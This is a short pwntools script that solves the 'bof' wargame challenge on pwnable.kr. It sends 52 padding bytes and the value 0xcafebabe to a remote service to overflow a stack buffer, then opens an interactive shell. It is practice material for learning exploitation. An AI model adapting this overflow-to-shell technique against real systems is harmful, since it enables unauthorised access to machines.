#!/usr/bin/env python3

from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little', word_size = 32, log_level = 'info')
#context(arch = 'i386', os = 'linux', endian = 'little', word_size = 32)

HOST = 'pwnable.kr'
PORT = 9000
binary = './bof'

p = remote(HOST, PORT)
# p = process(binary,stdin=process.PTY)

p.recvuntil("overflow me : ")

p.sendline(b"a"*52 + p32(0xcafebabe))

p.interactive()

p.clean()
p.close()
